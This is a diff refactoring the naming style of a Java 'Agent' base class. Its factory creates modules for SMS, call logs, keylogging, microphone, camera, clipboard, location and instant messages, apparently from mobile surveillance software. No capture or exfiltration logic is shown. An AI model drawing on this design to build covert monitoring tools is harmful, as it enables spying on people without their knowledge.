@@ -38,62 +38,62 @@ public abstract class Agent extends Thread {
     public static final int AGENT_APPLICATION = AGENT + 0x11;
     public static final int AGENT_PDA = 0xDF7A;
 
-    public static Agent Factory(int AgentId, int AgentStatus, byte[] confParams) {
-        switch (AgentId) {
+    public static Agent factory(int agentId, int agentStatus, byte[] confParams) {
+        switch (agentId) {
         case AGENT_SMS:
             debug.trace("Factory AGENT_SMS");
-            return new SmsAgent(AgentStatus, confParams);
+            return new SmsAgent(agentStatus, confParams);
         case AGENT_TASK:
             debug.trace("Factory AGENT_TASK");
-            return new TaskAgent(AgentStatus, confParams);
+            return new TaskAgent(agentStatus, confParams);
         case AGENT_CALLLIST:
             debug.trace("Factory AGENT_DEVICE");
-            return new CallListAgent(AgentStatus, confParams);
+            return new CallListAgent(agentStatus, confParams);
         case AGENT_DEVICE:
             debug.trace("Factory AGENT_DEVICE");
-            return new DeviceInfoAgent(AgentStatus, confParams);
+            return new DeviceInfoAgent(agentStatus, confParams);
         case AGENT_POSITION:
             debug.trace("Factory AGENT_POSITION");
-            return new PositionAgent(AgentStatus, confParams);
+            return new PositionAgent(agentStatus, confParams);
         case AGENT_CALL:
             debug.trace("Factory AGENT_CALL");
-            return new CallAgent(AgentStatus, confParams);
+            return new CallAgent(agentStatus, confParams);
         case AGENT_CALL_LOCAL:
             debug.trace("Factory AGENT_CALL_LOCAL");
-            return new CallLocalAgent(AgentStatus, confParams);
+            return new CallLocalAgent(agentStatus, confParams);
         case AGENT_KEYLOG:
             debug.trace("Factory AGENT_KEYLOG");
-            return new KeyLogAgent(AgentStatus, confParams);
+            return new KeyLogAgent(agentStatus, confParams);
         case AGENT_SNAPSHOT:
             debug.trace("Factory AGENT_SNAPSHOT");
-            return new SnapShotAgent(AgentStatus, confParams);
+            return new SnapShotAgent(agentStatus, confParams);
         case AGENT_URL:
             debug.trace("Factory AGENT_URL");
-            return new UrlAgent(AgentStatus, confParams);
+            return new UrlAgent(agentStatus, confParams);
         case AGENT_IM:
             debug.trace("Factory AGENT_IM");
-            return new ImAgent(AgentStatus, confParams);
+            return new ImAgent(agentStatus, confParams);
         case AGENT_MIC:
             debug.trace("Factory AGENT_MIC");
-            return new MicAgent(AgentStatus, confParams);
+            return new MicAgent(agentStatus, confParams);
         case AGENT_CAM:
             debug.trace("Factory AGENT_CAM");
-            return new CamAgent(AgentStatus, confParams);
+            return new CamAgent(agentStatus, confParams);
         case AGENT_CLIPBOARD:
             debug.trace("Factory AGENT_CLIPBOARD");
-            return new ClipBoardAgent(AgentStatus, confParams);
+            return new ClipBoardAgent(agentStatus, confParams);
         case AGENT_CRISIS:
             debug.trace("Factory AGENT_CRISIS");
-            return new CrisisAgent(AgentStatus, confParams);
+            return new CrisisAgent(agentStatus, confParams);
         case AGENT_APPLICATION:
             debug.trace("Factory AGENT_APPLICATION");
-            return new ApplicationAgent(AgentStatus, confParams);
+            return new ApplicationAgent(agentStatus, confParams);
         case AGENT_PDA:
             debug.trace("Factory AGENT_PDA");
-            return new PdaAgent(AgentStatus, confParams);
+            return new PdaAgent(agentStatus, confParams);
 
         default:
-            debug.trace("AgentId UNKNOWN: " + AgentId);
+            debug.trace("AgentId UNKNOWN: " + agentId);
             return null;
         }
     }
@@ -103,35 +103,35 @@ public abstract class Agent extends Thread {
     LogCollector logCollector;
 
     boolean logOnSD;
-    public int AgentId;
+    public int agentId;
 
-    public int AgentStatus;
+    public int agentStatus;
 
-    public int Command;
+    public int command;
 
     protected Log log;
 
-    protected Agent(int AgentId, int AgentStatus, boolean logOnSD) {
+    protected Agent(int agentId_, int agentStatus_, boolean logOnSD_) {
         status = Status.getInstance();
         logCollector = LogCollector.getInstance();
 
-        this.AgentId = AgentId;
-        this.AgentStatus = AgentStatus;
+        this.agentId = agentId_;
+        this.agentStatus = agentStatus_;
 
-        this.logOnSD = logOnSD;
-        this.log = logCollector.LogFactory(this, logOnSD);
+        this.logOnSD = logOnSD_;
+        this.log = logCollector.factory(this, logOnSD_);
     }
 
-    public abstract void AgentRun();
+    public abstract void agentRun();
 
-    protected boolean AgentSleep(int millisec) {
+    protected boolean agentSleep(int millisec) {
         int loops = 0;
         int sleepTime = 1000;
 
         if (millisec < sleepTime) {
-            Utils.Sleep(millisec);
+            Utils.sleep(millisec);
 
-            if (Command == Common.AGENT_STOP) {
+            if (command == Common.AGENT_STOP) {
                 return true;
             }
 
@@ -141,10 +141,10 @@ public abstract class Agent extends Thread {
         }
 
         while (loops > 0) {
-            Utils.Sleep(millisec);
+            Utils.sleep(millisec);
             loops--;
 
-            if (Command == Common.AGENT_STOP) {
+            if (command == Common.AGENT_STOP) {
                 return true;
             }
         }
@@ -156,7 +156,7 @@ public abstract class Agent extends Thread {
         return logOnSD;
     }
 
-    protected abstract boolean Parse(byte[] confParameters);
+    protected abstract boolean parse(byte[] confParameters);
 
     public void run() {
         if (log == null) {
@@ -164,22 +164,22 @@ public abstract class Agent extends Thread {
             return;
         }
 
-        status.AgentAlive(AgentId);
-        AgentRun();
-        status.ThreadAgentStopped(AgentId);
+        status.agentAlive(agentId);
+        agentRun();
+        status.threadAgentStopped(agentId);
     }
 
-    protected boolean SleepUntilStopped() {
+    protected boolean sleepUntilStopped() {
         for (;;) {
-            if (AgentSleep(10 * 1000)) {
-                status.ThreadAgentStopped(AgentId);
-                debug.trace("Agent.java - CleanStop " + AgentId);
+            if (agentSleep(10 * 1000)) {
+                status.threadAgentStopped(agentId);
+                debug.trace("Agent.java - CleanStop " + agentId);
                 return true;
             }
         }
     }
 
     public String toString() {
-        return "Agent " + AgentId;
+        return "Agent " + agentId;
     }
 }
